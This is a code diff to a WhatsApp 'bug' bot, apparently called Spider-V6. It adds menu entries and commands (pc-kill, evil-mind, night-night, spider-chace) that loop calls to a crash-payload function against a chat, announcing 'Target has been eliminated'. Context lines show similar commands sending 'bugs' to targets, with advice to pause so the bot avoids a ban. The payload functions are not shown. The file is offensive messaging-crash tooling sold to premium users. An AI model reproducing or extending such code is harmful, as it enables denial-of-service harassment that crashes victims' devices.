@@ -1027,6 +1027,7 @@ let itsmenu = `
 ┃❖ 𝐠𝐫𝐨𝐮𝐩𝐛𝐮𝐠𝐬
 ┃❖ 𝐨𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮
 ┃❖ 𝐨𝐭𝐡𝐞𝐫𝐦𝐞𝐧𝐮
+┃❖ 𝐩𝐜𝐛𝐮𝐠𝐬
 ┗━━━━━━━━━━
 © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
   ` 
@@ -1148,7 +1149,8 @@ deltaxcrash.sendMessage(m.chat, {
 ┃⬮ addowner
 ┃⬮ delprem
 ┃⬮ delowner
-┃⬮ buypanel
+┃⬮ self
+┃⬮ public
 ┗━━━━━━━━━━━━━━━━━
  © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
  ` 
@@ -1204,6 +1206,69 @@ deltaxcrash.sendMessage(m.chat, {
                     })
                     }
                  break
+case 'pcbugs':{
+let fuvk =
+ `   \`𝐃𝚵𝛁𝚰𝐋 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6\`
+         
+┏━━━━━━━━━━━━━━━━━━
+┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
+┃  ❖ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : ${runtime(process.uptime())}
+┗━━━━━━━━━━━━━━━━━
+┏━━━━━━━━━━━━━━━━━   
+┃⬮ night-night
+┃⬮ evil-mind
+┃⬮ spider-chace,amount
+┃⬮ pc-kill
+┗━━━━━━━━━━━━━━━━━
+ © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
+ `
+deltaxcrash.sendMessage(m.chat, { 
+	           text: fuvk,
+                    contextInfo: {
+                        externalAdReply: {
+                            showAdAttribution: false,
+                            title: global.namabot,
+                            body: global.namaCreator,
+                            thumbnailUrl: 'https://telegra.ph/file/1acb8cf39e54409b8621a.jpg', 
+                            sourceUrl: global.isLink,
+                            mediaType: 1,
+                            renderLargerThumbnail: true
+                        }
+                    }
+                }, {
+                    quoted: m
+                    })
+                    }
+                 break
+		
+case "owner": {
+const repf = await deltacrashx.sendMessage(from, { 
+contacts: { 
+displayName: `${list.length} Kontak`, 
+contacts: list }, contextInfo: {
+forwardingScore: 9999999, 
+isForwarded: true,
+mentionedJid: [sender]
+}}, { quoted: m })
+deltacrashx.sendMessage(from, { text : `Hello @${sender.split("@")[0]}, My owner is 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`, contextInfo:{
+forwardingScore: 9999999, 
+isForwarded: true,
+mentionedJid:[sender]
+}}, { quoted: repf })
+		}
+		
+case 'self': {
+if (!isOwner) return reply(mess.only.owner)
+deltacrashx.public = false
+reply('succes')
+}
+break
+case 'public': {
+if (!isOwner) return reply(mess.only.owner)
+deltacrashx.public = true
+reply('succes')
+}
+break
      
 case "kill-spider": {
 if (!isPremium) return reply('_</> Can only be used by premium users..._')
@@ -1340,6 +1405,32 @@ reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [threa
 }
 }
 break
+case 'pc-kill': case 'evil-mind': case 'night-night':  {
+if (!isPremium) return 
+for (let j = 0; j < 5; j++) {
+await ngeloc(m.chat, force)
+}
+await deltacrashx.sendMessage(m.chat, {
+contextInfo: {
+mentionedJid: ['00000@s.whatsapp.net'],
+externalAdReply: {
+showAdAttribution: false,
+renderLargerThumbnail: false,
+jpegThumbnail: `https://telegra.ph/file/b127513eb930ee73178dd.jpg`,
+title: `𝐒𝐩𝐢𝐝𝐞𝐫-𝐕6💀`,
+body: `⁗ ⋄Target down 💀🥹`,
+previewType: "VIDEO",
+sourceUrl: `༑ 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒💀𝐒𝐩𝐢𝐝𝐞𝐫-𝐕6⿻`,
+mediaType: 1,
+mediaUrl: 'https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e'
+}
+},
+text: '𝙏𝙖𝙧𝙜𝙚𝙩 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙚𝙡𝙞𝙢𝙞𝙣𝙖𝙩𝙚𝙙 𝘽𝙮 *𝙎𝙥𝙞𝙙𝙚𝙧-𝙑6* 𝘽𝙮  𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 '
+}, {
+quoted: m
+})
+}
+break
 
 
 case 'reboot': { 
@@ -1376,6 +1467,15 @@ await ngeloc(target, force)
 await bakdok(target, force)
 }
 await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}.ᯤ\n\n<!> Pause 2 minutes so that the bot is not banned.`)
+}
+break
+case 'spider-chace': {
+if (!isPremium) return reply(mess.premium)
+if (!q) return reply(`use .${command} 1`)
+for (let j = 0; j < q; j++) {
+ngeloc(m.chat, force)
+}
+await reply('✅Succes sent by spider v6')
 }
 break
 case "xhu":{
@@ -1866,6 +1966,40 @@ await ngeloc(target, m)
 await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}.ᯤ\n\n<!> Pause 2 minutes so that the bot is not banned.`)
 }
 break
+		case "ping": {
+  const startTime = new Date();
+  const pingMsg = await deltaxcrash.sendMessage(m.chat, { text: '*sᵖᵉᵉᵈ*' });
+
+ await deltaxcrash.relayMessage(m.chat, {
+      protocolMessage: {
+        key: pingMsg.key,
+        type: 14,
+        editedMessage: {
+          conversation: `* sᵖⁱᵈᵉʳ ᴠ6 sᵖᵉᵉᵈ ➟* *${new Date() - startTime}* ᴍs `
+        }
+      }
+    }, {});
+  } 
+break
+	case "runtime":
+                let pinga = ` รρเ∂εɾ ѵ6 ɦαร ɓεεɳ αcƭเѵε ƒσɾ ${runtime(process.uptime())}`
+               deltaxcrash.sendMessage(m.chat, {
+                    text: pinga,
+                    contextInfo: {
+                        externalAdReply: {
+                            showAdAttribution: true,
+                            title: `sᵖⁱᵈᵉʳ ᴠ6`,
+                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
+                            thumbnailUrl: 'https://telegra.ph/file/b127513eb930ee73178dd.jpg',
+                            sourceUrl: 'https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e',
+                            mediaType: 1,
+                            renderLargerThumbnail: true
+                        }
+                    }
+                }, {
+                    quoted: m
+                })
+                break
 case 'gfsCdgsGsGs': {
 
 if (!isPremium) return reply('_</> Can only be used by premium users..._')
